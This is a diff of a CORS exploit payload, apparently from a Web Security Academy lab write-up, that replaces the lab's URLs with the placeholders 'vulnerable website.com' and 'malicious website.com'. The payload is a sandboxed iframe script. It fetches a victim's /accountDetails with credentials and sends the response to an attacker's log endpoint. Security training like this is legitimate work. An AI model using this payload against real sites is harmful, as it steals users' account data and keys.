@@ -8,11 +8,11 @@
 <iframe sandbox="allow-scripts" srcdoc="<script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get','https://0aef00f9030f5c4681b59dde003400d1.web-security-academy.net/accountDetails',true);
+    req.open('get','vulnerable website.com/accountDetails',true);
     req.withCredentials = true;
     req.send();
     function reqListener() {
-        location='https://exploit-0a4200a403c25ccf815f9c7101f70056.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+        location='malicious website.com/log?key='+encodeURIComponent(this.responseText);
     };
 </script>"></iframe>
 ```
